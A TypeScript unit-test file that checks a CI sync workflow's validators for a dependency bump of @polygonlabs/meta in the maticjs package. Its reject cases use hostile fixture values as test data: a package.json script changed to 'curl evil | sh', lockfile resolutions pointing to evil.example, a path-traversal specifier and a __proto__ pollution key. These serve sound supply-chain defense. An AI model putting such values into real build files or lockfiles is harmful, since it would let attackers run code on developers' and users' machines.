/**
 * Unit tests for the meta sync content checks.
 *
 * The checks decide what the App token may sign, so each one gets an accept
 * case (what a real bump produces) and a reject case for every way a hostile
 * release could widen it. Fixtures are small synthetic excerpts shaped like
 * the real files; the real-data run lives in the workflow's local rehearsal.
 */
import { describe, expect, it } from 'vitest';

import { parseAbiFile, renderAbiFile } from '../../scripts/abi-file-format.mjs';

interface Manifest {
  from: string;
  to: string;
  baseSha: string;
  dryRun: boolean;
  title: string;
  branch: string;
  labels: string[];
  changed: string[];
  deleted: string[];
}
interface ChecksModule {
  checkBase: (params: { baseSha: string; contextSha: string; liveHead: string }) => void;
  checkPackageJson: (params: { baseText: string; newText: string; target: string }) => void;
  checkLockfile: (params: { baseText: string; newText: string; target: string }) => void;
  checkAbiFile: (params: { path: string; text: string; baseText: string }) => void;
  checkChangeset: (params: { path: string; text: string; target: string }) => void;
  checkManifest: (params: { manifest: Manifest }) => { target: string };
  checkArtifact: (params: {
    manifest: Manifest;
    readNew: (path: string) => string;
    readBase: (path: string) => string | null;
  }) => void;
}

const checksUrl = new URL('../../../../.github/scripts/meta-sync/checks.mjs', import.meta.url).href;
const {
  checkAbiFile,
  checkArtifact,
  checkBase,
  checkChangeset,
  checkLockfile,
  checkManifest,
  checkPackageJson
}: ChecksModule = await import(checksUrl);

const TARGET = '1.2.0';
const SHA_A = 'a'.repeat(40);
const SHA_B = 'b'.repeat(40);
const INTEGRITY = `sha512-${'A'.repeat(86)}==`;

const PACKAGE_JSON_BASE = `{
  "name": "@polygonlabs/maticjs",
  "scripts": {
    "build": "tsup"
  },
  "devDependencies": {
    "@polygonlabs/meta": "^1.1.1",
    "vitest": "^3.0.0"
  }
}
`;
const packageJsonFor = (version: string) => PACKAGE_JSON_BASE.replace('"^1.1.1"', `"${version}"`);

const lockfile = ({
  version,
  specifier = `^${version}`,
  packageLines,
  snapshot = '{}',
  extra = ''
}: {
  version: string;
  specifier?: string;
  packageLines?: string[];
  snapshot?: string;
  extra?: string;
}) => `lockfileVersion: '9.0'

importers:

  .:
    devDependencies:
      eslint:
        specifier: ^9.0.0
        version: 9.0.0

  packages/maticjs:
    devDependencies:
      '@polygonlabs/meta':
        specifier: ${specifier}
        version: ${version}
      vitest:
        specifier: ^3.0.0
        version: 3.0.0

packages:

  '@polygonlabs/meta@${version}':
${(packageLines ?? [`    resolution: {integrity: ${INTEGRITY}}`, "    engines: {node: '>=20'}"]).join('\n')}

  '@polygonlabs/verror@1.1.0':
    resolution: {integrity: sha512-${'B'.repeat(86)}==}${extra}

snapshots:

  '@polygonlabs/meta@${version}': ${snapshot}

  '@polygonlabs/verror@1.1.0': {}
`;

const LOCK_BASE = lockfile({ version: '1.1.1' });

const ABI = [{ type: 'function', name: 'f', inputs: [], outputs: [] }];
const SPECIFIER = '@polygonlabs/meta/abi/mainnet/v1/pos/ChildERC20';
const ABI_PATH = 'packages/maticjs/src/abi/ChildERC20.ts';
const abiText = renderAbiFile({ specifier: SPECIFIER, name: 'ChildERC20', abi: ABI });

const MANIFEST: Manifest = {
  from: '1.1.1',
  to: TARGET,
  baseSha: SHA_A,
  dryRun: false,
  title: `chore(maticjs): update vendored ABIs to @polygonlabs/meta ${TARGET}`,
  branch: 'automation/meta-sync',
  labels: ['dependencies', 'automation', 'run-e2e'],
  changed: [
    '.changeset/meta-sync-1-2-0.md',
    ABI_PATH,
    'packages/maticjs/package.json',
    'pnpm-lock.yaml'
  ],
  deleted: []
};

describe('checkBase', () => {
  it('accepts a base equal to the run commit and the live head', () => {
    expect(() => checkBase({ baseSha: SHA_A, contextSha: SHA_A, liveHead: SHA_A })).not.to.throw();
  });
  it('rejects a base that is not the run commit', () => {
    expect(() => checkBase({ baseSha: SHA_B, contextSha: SHA_A, liveHead: SHA_B })).to.throw(
      /checked out/
    );
  });
  it('rejects a base that is no longer the live head', () => {
    expect(() => checkBase({ baseSha: SHA_A, contextSha: SHA_A, liveHead: SHA_B })).to.throw(
      /current head/
    );
  });
  it('rejects a base that is not a commit id', () => {
    expect(() =>
      checkBase({ baseSha: 'master', contextSha: 'master', liveHead: 'master' })
    ).to.throw(/commit id/);
  });
});

describe('checkPackageJson', () => {
  const baseText = PACKAGE_JSON_BASE;
  it('accepts only the meta version string changed', () => {
    expect(() =>
      checkPackageJson({ baseText, newText: packageJsonFor(`^${TARGET}`), target: TARGET })
    ).not.to.throw();
  });
  it('rejects an extra dependency', () => {
    const newText = packageJsonFor(`^${TARGET}`).replace(
      '"vitest": "^3.0.0"',
      '"vitest": "^3.0.0",\n    "evil": "^1.0.0"'
    );
    expect(() => checkPackageJson({ baseText, newText, target: TARGET })).to.throw(/more than/);
  });
  it('rejects a changed script', () => {
    const newText = packageJsonFor(`^${TARGET}`).replace('"tsup"', '"curl evil | sh"');
    expect(() => checkPackageJson({ baseText, newText, target: TARGET })).to.throw(/more than/);
  });
  it('rejects reformatted text', () => {
    const newText = JSON.stringify(JSON.parse(packageJsonFor(`^${TARGET}`)));
    expect(() => checkPackageJson({ baseText, newText, target: TARGET })).to.throw(/more than/);
  });
  it('rejects a version other than ^target', () => {
    expect(() =>
      checkPackageJson({ baseText, newText: packageJsonFor('^9.9.9'), target: TARGET })
    ).to.throw(/more than/);
    expect(() =>
      checkPackageJson({ baseText, newText: packageJsonFor(TARGET), target: TARGET })
    ).to.throw(/more than/);
  });
  it('rejects a base that holds the meta entry twice', () => {
    const entry = '"@polygonlabs/meta": "^1.1.1"';
    const twice = PACKAGE_JSON_BASE.replace(
      '"vitest": "^3.0.0"',
      `"vitest": "^3.0.0",\n    "alias": "x",\n    ${entry}`
    );
    const newText = twice.replace(entry, `"@polygonlabs/meta": "^${TARGET}"`);
    expect(() => checkPackageJson({ baseText: twice, newText, target: TARGET })).to.throw(
      /not shaped/
    );
  });
  it('rejects a target that is not a stable version', () => {
    expect(() =>
      checkPackageJson({ baseText, newText: packageJsonFor('^1.2.0-rc.1'), target: '1.2.0-rc.1' })
    ).to.throw(/stable/);
  });
});

describe('checkLockfile', () => {
  const baseText = LOCK_BASE;
  const good = lockfile({ version: TARGET });
  it('accepts the meta entries moving to the target', () => {
    expect(() => checkLockfile({ baseText, newText: good, target: TARGET })).not.to.throw();
  });
  it('accepts a packages entry without an engines line', () => {
    const newText = lockfile({
      version: TARGET,
      packageLines: [`    resolution: {integrity: ${INTEGRITY}}`]
    });
    expect(() => checkLockfile({ baseText, newText, target: TARGET })).not.to.throw();
  });
  it('rejects a second package changing', () => {
    const newText = good.replace(
      "'@polygonlabs/verror@1.1.0': {}",
      "'@polygonlabs/verror@9.9.9': {}"
    );
    expect(() => checkLockfile({ baseText, newText, target: TARGET })).to.throw(
      /something other than/
    );
  });
  it('rejects a changed importer entry for another package', () => {
    const newText = good.replace('version: 3.0.0\n\npackages', 'version: 3.0.1\n\npackages');
    expect(() => checkLockfile({ baseText, newText, target: TARGET })).to.throw(
      /something other than/
    );
  });
  it('rejects a tarball resolution', () => {
    const newText = lockfile({
      version: TARGET,
      packageLines: [
        `    resolution: {integrity: ${INTEGRITY}, tarball: https://evil.example/meta.tgz}`
      ]
    });
    expect(() => checkLockfile({ baseText, newText, target: TARGET })).to.throw(/integrity-only/);
  });
  it('rejects text after the integrity resolution', () => {
    const newText = lockfile({
      version: TARGET,
      packageLines: [`    resolution: {integrity: ${INTEGRITY}}junk`]
    });
    expect(() => checkLockfile({ baseText, newText, target: TARGET })).to.throw(/integrity-only/);
  });
  it('rejects an engines line that is not a plain node range', () => {
    for (const engines of [
      '{free text}',
      "{node: '>=20', evil: 'x'}",
      "{node: &a '>=20'}",
      "{node: '>=20'\r}"
    ]) {
      const newText = lockfile({
        version: TARGET,
        packageLines: [`    resolution: {integrity: ${INTEGRITY}}`, `    engines: ${engines}`]
      });
      expect(() => checkLockfile({ baseText, newText, target: TARGET })).to.throw(/beyond/);
    }
  });
  it('rejects a git-style resolution', () => {
    const newText = lockfile({
      version: TARGET,
      packageLines: ['    resolution: {commit: abc, repo: https://evil.example/x.git, type: git}']
    });
    expect(() => checkLockfile({ baseText, newText, target: TARGET })).to.throw(/integrity-only/);
  });
  it('rejects extra lines in the packages entry', () => {
    const newText = lockfile({
      version: TARGET,
      packageLines: [
        `    resolution: {integrity: ${INTEGRITY}}`,
        "    engines: {node: '>=20'}",
        '    hasBin: true'
      ]
    });
    expect(() => checkLockfile({ baseText, newText, target: TARGET })).to.throw(/beyond/);
  });
  it('rejects a non-empty snapshot', () => {
    const newText = lockfile({
      version: TARGET,
      snapshot: '\n    dependencies:\n      evil: 1.0.0'
    });
    expect(() => checkLockfile({ baseText, newText, target: TARGET })).to.throw();
  });
  it('rejects a version that is not the target', () => {
    expect(() =>
      checkLockfile({ baseText, newText: lockfile({ version: '1.3.0' }), target: TARGET })
    ).to.throw(/importer entry/);
  });
  it('rejects a resolved version that is not the target even when the specifier is', () => {
    const newText = good.replace('version: 1.2.0\n      vitest', 'version: 1.1.1\n      vitest');
    expect(() => checkLockfile({ baseText, newText, target: TARGET })).to.throw(/importer entry/);
  });
  it('rejects a packages entry for another version', () => {
    const newText = good.replace("'@polygonlabs/meta@1.2.0':\n", "'@polygonlabs/meta@1.3.0':\n");
    expect(() => checkLockfile({ baseText, newText, target: TARGET })).to.throw(/packages entry/);
  });
  it('rejects a snapshots entry for another version', () => {
    const newText = good.replace("'@polygonlabs/meta@1.2.0': {}", "'@polygonlabs/meta@1.3.0': {}");
    expect(() => checkLockfile({ baseText, newText, target: TARGET })).to.throw(/snapshots entry/);
  });
  it('rejects a one-line snapshot that is not empty', () => {
    const newText = lockfile({ version: TARGET, snapshot: '{dependencies: {evil: 1.0.0}}' });
    expect(() => checkLockfile({ baseText, newText, target: TARGET })).to.throw(/snapshots entry/);
  });
  it('rejects a single extra line that is not engines', () => {
    const newText = lockfile({
      version: TARGET,
      packageLines: [`    resolution: {integrity: ${INTEGRITY}}`, '    hasBin: true']
    });
    expect(() => checkLockfile({ baseText, newText, target: TARGET })).to.throw(/beyond/);
  });
  it('rejects a specifier that is not ^target', () => {
    expect(() =>
      checkLockfile({
        baseText,
        newText: lockfile({ version: TARGET, specifier: '*' }),
        target: TARGET
      })
    ).to.throw(/importer entry/);
  });
});

describe('checkAbiFile', () => {
  const baseText = abiText;
  const check = (text: string, path = ABI_PATH) => checkAbiFile({ path, text, baseText });
  it('accepts a file in the generator output format', () => {
    expect(() => check(abiText)).not.to.throw();
    expect(parseAbiFile({ text: abiText }).name).to.equal('ChildERC20');
  });
  it('rejects a trailing statement', () => {
    expect(() => check(`${abiText}process.exit(1);\n`)).to.throw();
  });
  it('rejects a name that is not the file name', () => {
    expect(() => check(abiText, 'packages/maticjs/src/abi/ChildERC721.ts')).to.throw(
      /not ChildERC721ABI/
    );
  });
  it('rejects a specifier that differs from the base file', () => {
    for (const specifier of [
      'evil-package/abi',
      '@polygonlabs/meta/abi/../../../evil',
      '@polygonlabs/meta/abi/mainnet/v1/pos/ChildERC721'
    ]) {
      const text = renderAbiFile({ specifier, name: 'ChildERC20', abi: ABI });
      expect(() => check(text)).to.throw(/not from/);
    }
  });
  it('rejects a __proto__ key at any depth', () => {
    const polluted = JSON.parse('{"__proto__": {"polluted": true}}');
    // The format round-trips an own __proto__ key, so only the key walk sees it.
    expect(Object.keys(polluted)).to.deep.equal(['__proto__']);
    for (const abi of [
      [polluted],
      [{ type: 'function', name: 'f', inputs: [polluted], outputs: [] }]
    ]) {
      const text = renderAbiFile({ specifier: SPECIFIER, name: 'ChildERC20', abi });
      expect(parseAbiFile({ text }).abi).to.deep.equal(abi);
      expect(() => check(text)).to.throw(/__proto__/);
    }
  });
  it('rejects an ABI that is not an array', () => {
    const text = renderAbiFile({ specifier: SPECIFIER, name: 'ChildERC20', abi: { a: 1 } });
    expect(() => check(text)).to.throw(/array/);
  });
  it('rejects an array holding non-objects', () => {
    const text = renderAbiFile({ specifier: SPECIFIER, name: 'ChildERC20', abi: [1, 'x'] });
    expect(() => check(text)).to.throw(/array/);
  });
  it('rejects text that is not in the exact output format', () => {
    const text = abiText.replace('[\n  {', '[ {');
    expect(() => check(text)).to.throw();
    const reindented = abiText.replace('\n  {', '\n    {');
    expect(() => check(reindented)).to.throw(/exact output/);
  });
  it('rejects the files that are not generated', () => {
    for (const file of ['index.ts', 'failed-state-sync.ts']) {
      expect(() => check(abiText, `packages/maticjs/src/abi/${file}`)).to.throw(
        /not a generated file/
      );
    }
  });
});

describe('checkChangeset', () => {
  const path = '.changeset/meta-sync-1-2-0.md';
  const accept = (text: string) => checkChangeset({ path, text, target: TARGET });
  it('accepts empty, patch and minor front matter', () => {
    expect(() => accept('---\n---\n')).not.to.throw();
    expect(() => accept("---\n'@polygonlabs/maticjs': patch\n---\n\nBody.\n")).not.to.throw();
    expect(() => accept("---\n'@polygonlabs/maticjs': minor\n---\n\nBody.\n")).not.to.throw();
  });
  it('rejects major', () => {
    expect(() => accept("---\n'@polygonlabs/maticjs': major\n---\n\nBody.\n")).to.throw();
  });
  it('rejects another package or extra entries', () => {
    expect(() => accept("---\n'@polygonlabs/other': patch\n---\n")).to.throw();
    expect(() =>
      accept("---\n'@polygonlabs/maticjs': patch\n'@polygonlabs/other': patch\n---\n")
    ).to.throw();
  });
  it('rejects a file name for another target', () => {
    expect(() =>
      checkChangeset({ path: '.changeset/meta-sync-9-9-9.md', text: '---\n---\n', target: TARGET })
    ).to.throw(/not the changeset file/);
  });
});

describe('checkManifest', () => {
  const withChange = (change: Partial<Manifest>): Manifest => ({ ...MANIFEST, ...change });
  it('accepts the manifest prepare writes, with and without a dry run', () => {
    expect(checkManifest({ manifest: MANIFEST }).target).to.equal(TARGET);
    expect(() =>
      checkManifest({
        manifest: withChange({
          dryRun: true,
          branch: 'automation/meta-sync-dryrun',
          title: `[dry run] ${MANIFEST.title}`
        })
      })
    ).not.to.throw();
  });
  it('rejects a label outside the fixed set', () => {
    expect(() =>
      checkManifest({ manifest: withChange({ labels: ['dependencies', 'security'] }) })
    ).to.throw(/Labels/);
  });
  it('rejects a title for a different target', () => {
    expect(() =>
      checkManifest({
        manifest: withChange({ title: MANIFEST.title.replace(TARGET, '1.9.9') })
      })
    ).to.throw(/title/);
  });
  it('rejects a dry-run title on the real branch', () => {
    expect(() =>
      checkManifest({ manifest: withChange({ title: `[dry run] ${MANIFEST.title}` }) })
    ).to.throw(/title/);
  });
  it('rejects labels that are not a list', () => {
    expect(() =>
      checkManifest({ manifest: { ...MANIFEST, labels: 'dependencies' as unknown as string[] } })
    ).to.throw(/Labels/);
  });
  it('rejects duplicate labels', () => {
    expect(() =>
      checkManifest({ manifest: withChange({ labels: ['automation', 'automation'] }) })
    ).to.throw(/Labels/);
  });
  it('rejects a dry-run branch whose dryRun flag is false', () => {
    expect(() =>
      checkManifest({ manifest: withChange({ branch: 'automation/meta-sync-dryrun' }) })
    ).to.throw(/dryRun/);
  });
  it('rejects a path listed twice', () => {
    expect(() =>
      checkManifest({ manifest: withChange({ changed: [...MANIFEST.changed, ABI_PATH] }) })
    ).to.throw(/malformed/);
  });
  it('rejects deleted paths', () => {
    expect(() =>
      checkManifest({ manifest: withChange({ deleted: ['packages/maticjs/src/abi/x.ts'] }) })
    ).to.throw(/deletes nothing/);
  });
  it('rejects a branch outside the two bot branches', () => {
    expect(() => checkManifest({ manifest: withChange({ branch: 'master' }) })).to.throw(/branch/);
  });
  it('rejects a bump that does not change package.json and the lockfile', () => {
    expect(() => checkManifest({ manifest: withChange({ changed: [ABI_PATH] }) })).to.throw(
      /always changes/
    );
  });
});

describe('checkArtifact', () => {
  const files: Record<string, string> = {
    '.changeset/meta-sync-1-2-0.md': '---\n---\n',
    [ABI_PATH]: abiText,
    'packages/maticjs/package.json': packageJsonFor(`^${TARGET}`),
    'pnpm-lock.yaml': lockfile({ version: TARGET })
  };
  const base: Record<string, string> = {
    [ABI_PATH]: abiText,
    'packages/maticjs/package.json': PACKAGE_JSON_BASE,
    'pnpm-lock.yaml': LOCK_BASE
  };
  const run = ({
    manifest = MANIFEST,
    newFiles = files
  }: { manifest?: Manifest; newFiles?: Record<string, string> } = {}) =>
    checkArtifact({
      manifest,
      readNew: (path) => newFiles[path] ?? '',
      readBase: (path) => base[path] ?? null
    });
  it('accepts a complete genuine bump', () => {
    expect(() => run()).not.to.throw();
  });
  it('rejects an ABI file that does not exist in the base', () => {
    const path = 'packages/maticjs/src/abi/Brand.ts';
    const text = renderAbiFile({ specifier: SPECIFIER, name: 'Brand', abi: ABI });
    expect(() =>
      run({
        manifest: { ...MANIFEST, changed: [...MANIFEST.changed, path] },
        newFiles: { ...files, [path]: text }
      })
    ).to.throw(/does not exist in the base/);
  });
  it('rejects a bump without its changeset', () => {
    expect(() =>
      run({
        manifest: {
          ...MANIFEST,
          changed: MANIFEST.changed.filter((p) => !p.startsWith('.changeset'))
        }
      })
    ).to.throw(/exactly one changeset/);
  });
  it('rejects a tampered file inside an otherwise valid artifact', () => {
    expect(() => run({ newFiles: { ...files, [ABI_PATH]: `${abiText}// extra\n` } })).to.throw();
  });
});
